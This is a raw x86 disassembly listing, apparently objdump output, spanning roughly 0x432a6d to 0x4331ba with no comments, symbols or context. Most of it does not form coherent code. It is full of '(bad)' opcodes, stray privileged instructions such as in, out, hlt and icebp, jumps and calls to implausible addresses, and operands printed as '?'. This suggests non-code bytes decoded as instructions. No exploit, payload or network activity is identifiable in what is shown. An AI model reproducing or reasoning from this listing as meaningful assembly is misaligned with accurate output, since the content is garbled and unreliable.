  432a6d:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  432a73:	xor    DWORD PTR [esi],0xc
  432a76:	pushf  
  432a77:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  432a7d:	(bad)  
  432a7f:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  432a86:	dec    ebp
  432a87:	ret    
  432a88:	mov    edi,DWORD PTR [esi-0x4]
  432a8b:	pop    eax
  432a8c:	dec    ebp
  432a8d:	jne    0x432a1a
  432a8f:	xor    edi,esp
  432a91:	inc    eax
  432a92:	dec    ebp
  432a93:	jbe    0x432ae8
  432a95:	inc    eax
  432a96:	pop    ebp
  432a97:	add    edx,DWORD PTR [esi+0x8]
  432a9a:	push   ecx
  432a9b:	dec    eax
  432a9c:	push   ecx
  432a9d:	mov    eax,edi
  432a9f:	and    al,0xf0
  432aa1:	jo     0x432a8e
  432aa3:	mov    eax,DWORD PTR [ebx]
  432aa5:	sbb    BYTE PTR [ebp+0x4d],cl
  432aa8:	mov    eax,DWORD PTR [ebx]
  432aaa:	nop
  432aab:	or     BYTE PTR [eax],al
  432aad:	jne    0x432b06
  432aaf:	cmp    ebx,DWORD PTR [ecx+0x33893277]
  432ab5:	cld    
  432ab6:	xor    edi,edi
  432ab8:	add    edi,DWORD PTR [ebp+0x3]
  432abb:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  432ac1:	js     0x432a47
  432ac3:	jae    0x432ac7
  432ac5:	(bad)  
  432ac7:	xor    al,0x5d
  432ac9:	jmp    0x432a56
  432acb:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  432ad2:	fdecstp 
  432ad4:	test   BYTE PTR [edi],ah
  432ad6:	add    bh,BYTE PTR [ebp+0x0]
  432ad9:	add    ebx,DWORD PTR [ebp-0x77]
  432adc:	mov    edi,eax
  432ade:	cmp    al,0x0
  432ae1:	adc    dh,BYTE PTR [ebx]
  432ae3:	jge    0x432ae8
  432ae5:	mov    edi,DWORD PTR [ebx]
  432ae7:	jl     0x432af8
  432ae9:	clc    
  432aea:	dec    edi
  432aeb:	jge    0x432aed
  432aed:	mov    eax,DWORD PTR [ebx]
  432aef:	jb     0x432af9
  432af1:	mov    ecx,DWORD PTR [ebp-0x8]
  432af4:	mov    edi,edi
  432af6:	xor    edx,DWORD PTR [eax]
  432af8:	add    edi,DWORD PTR [ebx]
  432afa:	mov    DWORD PTR [ebp-0x10],edi
  432afd:	inc    edi
  432afe:	pop    ebp
  432aff:	jge    0x432b3c
  432b01:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  432b05:	mov    edx,0xc05d87f0
  432b0a:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  432b0e:	fimul  WORD PTR [eax]
  432b10:	fist   WORD PTR [ebp+0x1c]
  432b13:	in     al,dx
  432b14:	jne    0x432b02
  432b16:	mov    edi,DWORD PTR [edx-0x7a27a10]
  432b1c:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  432b20:	fdivp  st(0),st
  432b22:	fild   WORD PTR [ebp+0x4510f85c]
  432b28:	test   BYTE PTR [ebx+0x4d00fc02],cl
  432b2e:	inc    ebp
  432b2f:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  432b35:	mov    ebp,DWORD PTR [ebx-0x4]
  432b38:	adc    al,0x8b
  432b3a:	rcl    DWORD PTR [eax],0x48
  432b3d:	mov    esi,0x7080803
  432b42:	fiadd  WORD PTR [ebp+0x4d]
  432b45:	mov    WORD PTR [ebx+0x558bfc52],cs
  432b4b:	cld    
  432b4c:	xor    ebx,DWORD PTR [ebx+0x330103]
  432b52:	mov    DWORD PTR [edi+0x872dc],edi
  432b58:	xlat   BYTE PTR ds:[ebx]
  432b59:	into   
  432b5a:	ffreep st(6)
  432b5c:	retf   0x6c7
  432b5f:	iret   
  432b60:	dec    ebp
  432b61:	inc    ebp
  432b62:	mov    DWORD PTR [ebx],edi
  432b64:	fmul   QWORD PTR [edi]
  432b66:	dec    ebp
  432b67:	jnp    0x432b9c
  432b69:	add    BYTE PTR [ebx],al
  432b6b:	mov    ecx,DWORD PTR [esp+edi*8]
  432b6e:	inc    ebp
  432b6f:	dec    ebp
  432b70:	lea    esi,[ebx]
  432b72:	add    DWORD PTR [ebx],eax
  432b74:	jb     0x432bb1
  432b76:	add    BYTE PTR [edi],cl
  432b78:	inc    ebp
  432b79:	imul   eax,edi,0x858bd800
  432b7f:	cld    
  432b80:	clc    
  432b81:	mov    DWORD PTR [ebp+0x0],eax
  432b84:	inc    DWORD PTR [eax]
  432b86:	or     al,0xde
  432b88:	sbb    bh,0x1
  432b8b:	retf   
  432b8c:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  432b93:	dec    ebp
  432b94:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  432b9a:	enter  0x12de,0xdf
  432b9e:	inc    ebp
  432b9f:	pop    ebp
  432ba0:	dec    DWORD PTR [ebx-0x257f0ff4]
  432ba6:	add    DWORD PTR [edx],edx
  432ba8:	add    BYTE PTR [ebp+0x50],dl
  432bab:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  432bb1:	xor    esi,DWORD PTR [ecx-0x38c699fd]
  432bb7:	or     ah,al
  432bb9:	pop    ss
  432bba:	cdq    
  432bbb:	push   ebp
  432bbc:	clc    
  432bbd:	mov    eax,DWORD PTR [ebp-0x4]
  432bc0:	xor    edx,edx
  432bc2:	add    esi,DWORD PTR [ebx]
  432bc4:	cmp    eax,DWORD PTR [ebx]
  432bc6:	hlt    
  432bc7:	cmp    DWORD PTR [ebx],esp
  432bc9:	or     al,BYTE PTR [ebp+0xf]
  432bcc:	mov    eax,DWORD PTR [edx]
  432bce:	loopne 0x432bd0
  432bd0:	(bad)  
  432bd1:	mov    ecx,esi
  432bd3:	cld    
  432bd4:	pushf  
  432bd5:	pop    ebp
  432bd6:	cdq    
  432bd7:	mov    esi,DWORD PTR [edx]
  432bd9:	lock mov eax,eax
  432bdc:	adc    BYTE PTR [ebx],al
  432bde:	or     BYTE PTR [ebx+0x4d001001],0xcf
  432be5:	xor    ebp,DWORD PTR [edi+0x50e45189]
  432beb:	dec    ebp
  432bec:	mov    ecx,DWORD PTR [ebx-0x31390304]
  432bf2:	(bad)  
  432bf3:	iret   
  432bf4:	inc    ebp
  432bf5:	(bad)  
  432bf6:	jne    0x432c45
  432bf8:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  432bfe:	(bad)  
  432bff:	cmp    ebx,eax
  432c01:	je     0x432b89
  432c03:	add    edi,edi
  432c05:	or     bh,bh
  432c07:	dec    ebp
  432c08:	inc    ebp
  432c09:	mov    esi,DWORD PTR [ebx]
  432c0b:	cld    
  432c0c:	add    ecx,esi
  432c0e:	cmp    ecx,DWORD PTR [eax-0xc]
  432c11:	mov    edx,DWORD PTR [edi]
  432c13:	or     BYTE PTR [ebp-0x7c],al
  432c16:	mov    ebx,DWORD PTR [ecx-0x7639cd18]
  432c1c:	test   BYTE PTR [ecx+ebx*4],cl
  432c1f:	inc    ebp
  432c20:	xor    bh,BYTE PTR ds:0x8be89c89
  432c26:	out    dx,eax
  432c27:	adc    BYTE PTR [eax],al
  432c29:	jne    0x432bf2
  432c2b:	mov    ebp,esp
  432c2d:	fcomp  DWORD PTR [ebx]
  432c2f:	add    BYTE PTR [ecx],al
  432c31:	inc    DWORD PTR [ebp-0x75]
  432c34:	mov    esp,?
  432c36:	add    al,0xce
  432c38:	mov    ecx,edi
  432c3a:	cld    
  432c3b:	inc    ebp
  432c3c:	fidivr WORD PTR [ebx]
  432c3e:	fbstp  TBYTE PTR [ebp-0x3e]
  432c41:	mov    eax,DWORD PTR [eax]
  432c43:	adc    BYTE PTR [ebx-0x3974038b],cl
  432c49:	fadd   st,st(7)
  432c4b:	add    BYTE PTR [ebp-0x1],al
  432c4e:	mov    ecx,DWORD PTR [esp+edi*8]
  432c51:	inc    ebp
  432c52:	mov    bh,0xc7
  432c55:	loopne 0x432c9c
  432c57:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  432c5d:	add    DWORD PTR [ebx],esi
  432c5f:	pushf  
  432c60:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  432c66:	mov    eax,edi
  432c68:	cwde   
  432c69:	inc    ebp
  432c6a:	inc    ebp
  432c6b:	jne    0x432bf8
  432c6d:	mov    esp,esp
  432c6f:	clc    
  432c70:	add    al,0x4d
  432c72:	mov    DWORD PTR [ebx],esi
  432c74:	or     al,0x33
  432c76:	inc    ebp
  432c77:	lea    ecx,[ebx-0x398d13fd]
  432c7d:	add    bh,al
  432c7f:	inc    ebp
  432c80:	ror    DWORD PTR [ebx+0x45d829],0x8b
  432c87:	add    ebp,esp
  432c89:	shufps xmm1,xmm3,0xc7
  432c8d:	(bad)  
  432c8e:	jmp    0x748867b7
  432c93:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  432c99:	hlt    
  432c9a:	mov    ecx,DWORD PTR [edi]
  432c9c:	fadd   DWORD PTR [ebp+0x0]
  432c9f:	xor    ecx,DWORD PTR [edi]
  432ca1:	add    ecx,ecx
  432ca3:	cmp    edi,edi
  432ca5:	pmuludq mm7,QWORD PTR [edx+0x50]
  432ca9:	(bad)  
  432caa:	jmp    0x432c37
  432cac:	mov    edi,esp
  432cae:	or     al,0xc6
  432cb0:	inc    ebp
  432cb1:	(bad)  
  432cb2:	mov    eax,DWORD PTR [ebp+0x10]
  432cb5:	jne    0x432c40
  432cb7:	mov    eax,DWORD PTR [ecx]
  432cb9:	clc    
  432cba:	add    BYTE PTR [ebp-0x40],cl
  432cbd:	xor    edx,DWORD PTR [eax-0x73]
  432cc0:	jne    0x432cc3
  432cc2:	push   DWORD PTR [edx+0x8]
  432cc5:	add    BYTE PTR [ebp+0x45],al
  432cc8:	mov    ebp,ecx
  432cca:	cld    
  432ccb:	add    BYTE PTR [ebp+0x0],cl
  432cce:	xor    eax,DWORD PTR [ebp+0x3]
  432cd1:	mov    ?,WORD PTR [ebx]
  432cd3:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  432cd9:	sub    eax,0x5d330e4d
  432cde:	lea    esi,[ebx]
  432ce0:	add    DWORD PTR [ebx],eax
  432ce2:	jb     0x432ccd
  432ce4:	add    BYTE PTR [eax],al
  432ce6:	inc    ebp
  432ce7:	add    bl,ch
  432ce9:	inc    ebp
  432cea:	mov    esi,DWORD PTR [ebx]
  432cec:	or     al,0x3
  432cee:	(bad)  
  432cef:	mov    edi,eax
  432cf1:	in     al,dx
  432cf2:	scas   eax,DWORD PTR es:[edi]
  432cf3:	inc    ebp
  432cf4:	mov    esi,DWORD PTR [ebx]
  432cf6:	in     al,0x3
  432cf8:	add    al,0x89
  432cfa:	mov    ecx,DWORD PTR [eax+edi*8]
  432cfd:	dec    ebp
  432cfe:	(bad)  
  432cff:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3167]
  432d06:	mov    ecx,eax
  432d08:	cld    
  432d09:	push   es
  432d0a:	dec    ebp
  432d0b:	add    al,0x33
  432d0d:	mov    DWORD PTR [ebx],eax
  432d0f:	in     al,dx
  432d10:	cmp    DWORD PTR [ebp-0x67],eax
  432d13:	mov    eax,DWORD PTR [ebp-0xba0068]
  432d19:	mov    edx,DWORD PTR [ebp-0x4]
  432d1c:	mov    ecx,DWORD PTR [ebp-0x2c]
  432d1f:	xor    eax,DWORD PTR [ebp+0x3]
  432d22:	cmp    DWORD PTR [ebx],0x8b327498
  432d28:	xor    edi,esp
  432d2a:	jmp    0xff772a7c
  432d2f:	add    ecx,DWORD PTR [ebp-0x3f]
  432d32:	xor    ebx,DWORD PTR [edi]
  432d34:	add    eax,ecx
  432d36:	cmp    ebx,DWORD PTR [eax]
  432d38:	mov    ecx,DWORD PTR [ebp-0x4]
  432d3b:	mov    ecx,DWORD PTR [eax]
  432d3d:	adc    BYTE PTR [ebp-0x80],al
  432d40:	jmp    0x432d43
  432d42:	mov    eax,DWORD PTR [eax]
  432d44:	cld    
  432d45:	mov    bh,0xc6
  432d47:	push   ecx
  432d48:	(bad)  
  432d49:	jne    0x432da9
  432d4b:	dec    ecx
  432d4d:	or     BYTE PTR [ecx+ebx*1],cl
  432d50:	push   ebp
  432d51:	inc    ebp
  432d52:	in     al,dx
  432d53:	add    ebp,esp
  432d55:	or     bh,al
  432d57:	dec    ebp
  432d58:	cld    
  432d59:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  432d5f:	cmp    DWORD PTR [ecx],0x2
  432d62:	pushf  
  432d63:	dec    DWORD PTR [ebx+0x45510cf4]
  432d69:	mov    DWORD PTR [ebx+0x5145fc0c],ecx
  432d6f:	mov    edx,DWORD PTR [ecx+0xc]
  432d72:	xor    eax,esi
  432d74:	mov    edx,0xc172c7
  432d79:	inc    ebp
  432d7a:	mov    esi,DWORD PTR [ebp+0x8]
  432d7d:	mov    eax,edx
  432d7f:	call   0x84c7f474
  432d84:	add    DWORD PTR [ecx-0x76bace00],ebx
  432d8a:	mov    ebp,eax
  432d8c:	or     BYTE PTR [eax],dl
  432d8e:	jo     0x432ddd
  432d90:	push   edi
  432d91:	xor    esi,DWORD PTR [ebp+0x3]
  432d94:	(bad)  
  432d95:	pmulhuw mm0,mm1
  432d98:	test   DWORD PTR [ebp-0x8],ecx
  432d9b:	mov    DWORD PTR [ebp-0x67],eax
  432d9e:	mov    eax,DWORD PTR [ebp-0x4]
  432da1:	xor    edi,DWORD PTR [ebp-0x73]
  432da4:	xor    eax,DWORD PTR [ebx]
  432da6:	xor    esi,DWORD PTR [edx+0x3]
  432da9:	add    BYTE PTR [ecx],bh
  432dab:	inc    ebp
  432dac:	(bad)  
  432dad:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  432db3:	mov    DWORD PTR [eax],0x750f0004
  432db9:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  432dbf:	lock add BYTE PTR [ebp+0x0],cl
  432dc3:	mov    esi,DWORD PTR [ebp-0x18]
  432dc6:	mov    ebp,edx
  432dc8:	or     al,0x72
  432dca:	ja     0x432dcc
  432dcc:	mov    edx,esi
  432dce:	cld    
  432dcf:	(bad)  
  432dd2:	cli    
  432dd3:	mov    esi,DWORD PTR [ebp-0x4]
  432dd6:	cmp    ecx,esi
  432dd8:	bswap  edi
  432dda:	(bad)
  432dde:	mov    esi,DWORD PTR [ebp-0x4]
  432de1:	mov    esi,ecx
  432de3:	clc    
  432de4:	repnz add esi,DWORD PTR [ebp+0x45]
  432de8:	push   ebx
  432de9:	xor    eax,DWORD PTR [ebp+0x3]
  432dec:	cmp    ebx,DWORD PTR [edi-0x64]
  432def:	pop    ebx
  432df0:	jmp    0x432eb7
  432df5:	mov    esi,DWORD PTR [ebp-0x7d]
  432df8:	xor    ebp,DWORD PTR [eax]
  432dfa:	lea    eax,[ebp-0x8]
  432dfd:	ss repnz pushf 
  432e00:	out    dx,eax
  432e01:	(bad)  
  432e02:	neg    eax
  432e04:	ins    DWORD PTR es:[edi],dx
  432e05:	test   esi,edi
  432e07:	clc    
  432e08:	pop    esp
  432e09:	inc    ebp
  432e0a:	or     BYTE PTR [ecx+0x450f0c7d],cl
  432e10:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  432e16:	add    cl,al
  432e18:	jne    0x432db3
  432e1a:	mov    esi,DWORD PTR [edx]
  432e1c:	in     al,dx
  432e1d:	push   esi
  432e1e:	xor    BYTE PTR [ebp-0xe],dh
  432e21:	add    edi,esi
  432e23:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  432e29:	add    cl,bh
  432e2b:	mov    edi,DWORD PTR [ebp+0x8]
  432e2e:	mov    DWORD PTR [ebp-0x14],esi
  432e31:	add    esi,DWORD PTR [ebp+0x3c]
  432e34:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  432e3a:	mov    ah,0x3d
  432e3c:	cdq    
  432e3d:	pushf  
  432e3e:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  432e44:	jne    0x432dd1
  432e46:	mov    ecx,DWORD PTR [esp+ebp*8]
  432e49:	icebp  
  432e4a:	icebp  
  432e4b:	shl    edx,0xf2
  432e4e:	(bad)  
  432e4f:	mov    ah,0x16
  432e51:	inc    eax
  432e52:	jne    0x432de7
  432e54:	mov    ecx,DWORD PTR [edi]
  432e56:	in     al,dx
  432e57:	jmp    0x432e4a
  432e59:	add    dl,dh
  432e5b:	mov    edi,esi
  432e5d:	or     al,0x8
  432e5f:	inc    ebp
  432e60:	jne    0x432e65
  432e62:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  432e68:	ret    
  432e69:	or     bh,bh
  432e6b:	jge    0x432e55
  432e6d:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  432e73:	xor    edi,eax
  432e75:	add    esi,DWORD PTR [ebp-0x77]
  432e78:	mov    ebx,esp
  432e7a:	clc    
  432e7b:	neg    DWORD PTR [ebp-0x7c]
  432e7e:	xor    eax,DWORD PTR [eax]
  432e80:	cmp    eax,DWORD PTR [eax]
  432e82:	repz jne 0x432e1a
  432e85:	xor    eax,DWORD PTR [ecx]
  432e87:	add    ebx,DWORD PTR [eax]
  432e89:	mov    DWORD PTR [ebp-0x8],eax
  432e8c:	mov    eax,edi
  432e8e:	cld    
  432e8f:	lock pop eax
  432e91:	test   DWORD PTR [ebx],esi
  432e93:	clc    
  432e94:	add    edx,DWORD PTR [edi-0x740bff77]
  432e9a:	fdivp  st(4),st
  432e9c:	test   ecx,esi
  432e9e:	(bad)  
  432e9f:	jnp    0x432ea0
  432ea1:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  432ea7:	jae    0x432e34
  432ea9:	sub    edi,esp
  432eab:	(bad)  
  432eac:	shl    DWORD PTR [eax-0x3e],0x89
  432eb0:	leave  
  432eb1:	call   0x8198e5be
  432eb6:	in     al,dx
  432eb7:	(bad)  
  432eb8:	in     al,dx
  432eb9:	add    bh,al
  432ebb:	mov    esp,edi
  432ebd:	in     al,dx
  432ebe:	test   DWORD PTR [ebp-0x8],edi
  432ec1:	mov    eax,DWORD PTR [ebp+0x2b]
  432ec4:	cmp    DWORD PTR [ebx],eax
  432ec6:	pushf  
  432ec7:	jnp    0x57322b00
  432ecd:	xor    edx,DWORD PTR [ecx-0x77]
  432ed0:	push   ecx
  432ed1:	loopne 0x432f06
  432ed3:	jne    0x432e90
  432ed5:	mov    esi,DWORD PTR [edx-0x20]
  432ed8:	add    BYTE PTR [ebp-0x3d],bh
  432edb:	xor    eax,DWORD PTR [ebp-0x73]
  432ede:	mov    edi,DWORD PTR [esi]
  432ee0:	cld    
  432ee1:	jb     0x432ea9
  432ee3:	add    bl,al
  432ee5:	jne    0x432f2c
  432ee7:	mov    edx,DWORD PTR [edi-0x10]
  432eea:	jge    0x432f69
  432eec:	mov    esi,DWORD PTR [ebx]
  432eee:	lock add ecx,DWORD PTR [ebp+0x3b]
  432ef2:	xor    esi,DWORD PTR [ebp-0x77]
  432ef5:	mov    esi,eax
  432ef7:	lock inc ebp
  432ef9:	jge    0x432f31
  432efb:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  432f02:	dec    ebp
  432f03:	mov    esi,DWORD PTR [ebx]
  432f05:	loopne 0x432e90
  432f07:	jge    0x432f01
  432f09:	add    DWORD PTR [ebp-0x7d],eax
  432f0c:	test   BYTE PTR [edx],0x9c
  432f0f:	dec    ebp
  432f10:	mov    esi,DWORD PTR [ebp-0xc]
  432f13:	mov    ecx,DWORD PTR [ebp-0xc]
  432f16:	xor    ebx,DWORD PTR [ebp-0x77]
  432f19:	mov    esi,esp
  432f1b:	in     al,0x45
  432f1d:	jge    0x432f59
  432f1f:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  432f26:	dec    ebp
  432f27:	inc    esp
  432f28:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  432f2e:	inc    ebp
  432f2f:	hlt    
  432f30:	ss jne 0x432ed2
  432f33:	mov    edi,DWORD PTR [eax+0xf19504]
  432f39:	repnz mov DWORD PTR [ebp+0x20],ebx
  432f3d:	cmp    eax,DWORD PTR [ebp+0xf]
  432f40:	test   DWORD PTR [edi+ecx*1-0x1],edx
  432f44:	fistp  WORD PTR [ebx+0x0]
  432f47:	inc    ebp
  432f48:	mov    ebx,DWORD PTR [edi+0xc]
  432f4b:	add    eax,eax
  432f4d:	inc    ebp
  432f4e:	test   BYTE PTR [ebx],dh
  432f50:	add    eax,DWORD PTR [ebx]
  432f52:	add    BYTE PTR [esi+0x45],bl
  432f55:	ret    0x85
  432f58:	jnp    0x5443b327
  432f5e:	inc    bp
  432f60:	inc    ebp
  432f61:	ss mov ecx,0xc78a9c
  432f67:	fdiv   QWORD PTR [ebx]
  432f69:	test   DWORD PTR [ecx+0x453af8],edi
  432f6f:	push   ebx
  432f70:	add    edi,DWORD PTR [esi+0x708088b]
  432f76:	cmp    esi,eax
  432f78:	setns  BYTE PTR [ecx-0x74fcffce]
  432f7f:	mov    esp,edi
  432f81:	call   0x33ce74d3
  432f86:	or     BYTE PTR [ebx],al
  432f88:	inc    ecx
  432f89:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  432f8f:	and    BYTE PTR [ebp-0x7074f0bb],al
  432f95:	lock add cl,al
  432f98:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  432f9f:	mov    ch,0x45
  432fa1:	clc    
  432fa2:	xor    eax,DWORD PTR [ebp+0x3]
  432fa5:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  432fab:	inc    ebp
  432fac:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  432fb2:	mov    edi,eax
  432fb4:	mov    eax,DWORD PTR [ebp+0x3c]
  432fb7:	mov    ecx,DWORD PTR [eax]
  432fb9:	hlt    
  432fba:	inc    ebp
  432fbb:	ror    DWORD PTR [ebx+0x818c45],0xf4
  432fc2:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  432fc8:	push   ebp
  432fc9:	mov    edi,DWORD PTR [ebx]
  432fcb:	in     al,dx
  432fcc:	jne    0x432f8f
  432fce:	mov    eax,DWORD PTR [ebp-0x28]
  432fd1:	add    DWORD PTR [eax],0xe8058dec
  432fd7:	clc    
  432fd8:	mov    esi,DWORD PTR [edi-0x8]
  432fdb:	add    dh,dl
  432fdd:	rol    WORD PTR [ebp-0x1],cl
  432fe1:	mov    edx,DWORD PTR [eax+0x8]
  432fe4:	jne    0x432fa6
  432fe6:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  432fed:	inc    ebp
  432fee:	push   esp
  432fef:	test   DWORD PTR [ecx+0xf],ecx
  432ff2:	sub    edx,esp
  432ff4:	add    eax,DWORD PTR [eax]
  432ff6:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  432ffc:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  433003:	mov    eax,DWORD PTR [ecx]
  433005:	and    BYTE PTR [eax],al
  433007:	cmp    BYTE PTR [eax],dl
  433009:	add    BYTE PTR [ebp+0x66],al
  43300c:	inc    ecx
  43300e:	push   esp
  43300f:	(bad)  
  433010:	jne    0x433012
  433012:	push   edx
  433013:	enterw 0xc1,0x4d
  433018:	mov    esp,DWORD PTR [esi+0x20]
  43301b:	add    DWORD PTR [ecx-0x7b],eax
  43301e:	add    eax,DWORD PTR [ebx]
  433020:	str    WORD PTR [eax+0x45]
  433024:	lea    ecx,[ebx+0x45890801]
  43302a:	sbb    BYTE PTR [ebx],al
  43302c:	dec    ebp
  43302d:	cmp    al,0xf
  43302f:	inc    ebp
  433030:	push   eax
  433031:	mov    esi,DWORD PTR [ebx]
  433033:	push   eax
  433034:	add    eax,eax
  433036:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  43303d:	inc    ebp
  43303e:	add    BYTE PTR [esi],dh
  433040:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  433047:	(bad)  
  433048:	mov    ebx,eax
  43304a:	loopne 0x433091
  43304c:	dec    ebp
  43304d:	mov    ecx,DWORD PTR [edi]
  43304f:	cld    
  433050:	push   eax
  433051:	xchg   DWORD PTR [ebx],esi
  433053:	add    DWORD PTR [ebx],ebp
  433055:	add    BYTE PTR [ebx],ch
  433057:	or     BYTE PTR [ecx],bh
  433059:	dec    ecx
  43305a:	loopne 0x43305f
  43305c:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  433062:	push   ebp
  433063:	add    DWORD PTR [ebx+0x55100800],eax
  433069:	dec    ebp
  43306a:	jmp    0x432ff5
  43306c:	mov    esp,DWORD PTR [eax]
  43306e:	sbb    dl,dl
  433070:	inc    eax
  433071:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  433077:	add    BYTE PTR [ebx+0x74528555],cl
  43307d:	push   ebp
  43307e:	div    DWORD PTR [ebx]
  433080:	and    eax,DWORD PTR [ebx]
  433082:	add    edx,DWORD PTR [edx-0x30]
  433085:	jno    0x433012
  433087:	inc    DWORD PTR [eax+eiz*1]
  43308a:	inc    ebp
  43308b:	push   eax
  43308c:	push   eax
  43308d:	mov    esp,DWORD PTR [edi-0x74beff1c]
  433093:	mov    edi,esp
  433095:	push   eax
  433096:	inc    ebp
  433097:	enter  0x458b,0x8
  43309b:	push   ecx
  43309c:	(bad)  
  43309d:	call   0x10d3a75
  4330a2:	pop    ss
  4330a3:	push   ebp
  4330a4:	mov    ecx,DWORD PTR [ebx+0x489408]
  4330aa:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4330b0:	push   ecx
  4330b1:	jo     0x43309b
  4330b3:	inc    DWORD PTR [edi]
  4330b5:	or     BYTE PTR [eax],al
  4330b7:	call   0xce3801
  4330bc:	fmul   QWORD PTR [ebp+0x55]
  4330bf:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4330c5:	mov    bh,0x8c
  4330c7:	adc    al,0x99
  4330c9:	dec    esp
  4330ca:	xor    bl,BYTE PTR [eax]
  4330cc:	mov    ecx,DWORD PTR [ebp+0xc]
  4330cf:	mov    eax,DWORD PTR [ebp-0x4]
  4330d2:	mov    esi,DWORD PTR [edi-0x3148f924]
  4330d8:	push   es
  4330d9:	retf   
  4330da:	mov    BYTE PTR [ebp-0x30],0x3b
  4330de:	inc    ebp
  4330df:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4330e6:	retf   0x83fc
  4330e9:	into   
  4330ea:	dec    ebp
  4330eb:	retf   
  4330ec:	mov    ecx,DWORD PTR [ebp-0x74]
  4330ef:	mov    eax,DWORD PTR [eax]
  4330f1:	fdiv   QWORD PTR [ebx]
  4330f3:	mov    bh,0x3
  4330f5:	push   es
  4330f6:	mov    esi,ecx
  4330f8:	sbb    cl,dl
  4330fa:	dec    ebp
  4330fb:	sar    DWORD PTR [ebx],cl
  4330fd:	push   ebp
  4330fe:	jne    0x43310f
  433100:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  433106:	lea    ebx,[eax]
  433108:	call   0xf4ccbccf
  43310d:	sbb    dh,dl
  43310f:	add    edx,ebx
  433111:	push   ebp
  433112:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  433118:	push   ecx
  433119:	mov    DWORD PTR [eax-0x30],edx
  43311c:	test   DWORD PTR [edx],eax
  43311e:	xadd   esp,esi
  433121:	pop    es
  433122:	add    cl,dl
  433124:	mov    eax,ecx
  433126:	or     al,0x45
  433128:	(bad)  
  433129:	push   eax
  43312a:	add    DWORD PTR [edx+0x0],eax
  43312d:	add    ecx,DWORD PTR [ecx]
  43312f:	and    dh,cl
  433131:	call   0xc73a01
  433136:	add    DWORD PTR [ebp+0x0],edx
  433139:	mov    esp,DWORD PTR [ebp+0x18]
  43313c:	add    BYTE PTR [eax+0x48],cl
  43313f:	xor    eax,DWORD PTR [eax]
  433141:	add    esp,DWORD PTR [esi+0x3b]
  433144:	inc    ebp
  433145:	je     0x4330ca
  433147:	push   ecx
  433148:	push   es
  433149:	dec    ebp
  43314a:	mov    DWORD PTR [ebx],eax
  43314c:	(bad)  
  43314d:	or     al,0x5e
  43314f:	inc    eax
  433150:	add    BYTE PTR [ebx],al
  433152:	data16 and BYTE PTR [ebp+0x50],al
  433156:	sub    DWORD PTR [ecx],0xfffffff8
  433159:	add    BYTE PTR [ebp-0x75],ah
  43315c:	add    BYTE PTR [eax],bl
  43315e:	enter  0x894d,0x8b
  433162:	int3   
  433163:	loopne 0x43319f
  433165:	rol    BYTE PTR [eax],0x33
  433168:	lea    cx,[ebp+0xa]
  43316c:	data16 jb 0x4331b4
  43316f:	add    BYTE PTR [ebx+0x44890855],cl
  433175:	sbb    ah,al
  433177:	inc    ebp
  433178:	cmp    BYTE PTR [edi],cl
  43317a:	add    BYTE PTR [edx+0x66],dl
  43317d:	xor    ecx,DWORD PTR [eax]
  43317f:	sub    edi,esi
  433181:	mov    eax,DWORD PTR [eax]
  433183:	or     al,0x66
  433185:	ror    edx,cl
  433187:	dec    ebp
  433188:	inc    ebp
  433189:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43318f:	cld    
  433190:	or     BYTE PTR [edi+0x4501dd],dl
  433196:	ret    0xe8ce
  433199:	retf   
  43319a:	(bad)  
  43319b:	dec    ebp
  43319c:	mov    al,0x8b
  43319e:	in     al,dx
  43319f:	and    BYTE PTR [ebx],bh
  4331a1:	or     al,BYTE PTR [ebp+0x27]
  4331a4:	in     al,dx
  4331a5:	xchg   eax,ebp
  4331a7:	add    edi,eax
  4331a9:	add    BYTE PTR [eax+0x3f52ed55],bh
  4331af:	push   ebp
  4331b0:	inc    ebp
  4331b1:	xor    ebx,edx
  4331b3:	add    ebp,eax
  4331b5:	push   edx
  4331b6:	push   bp
  4331b8:	inc    ebp
  4331b9:	(bad)  
  4331ba:	jmp    0xc342f813
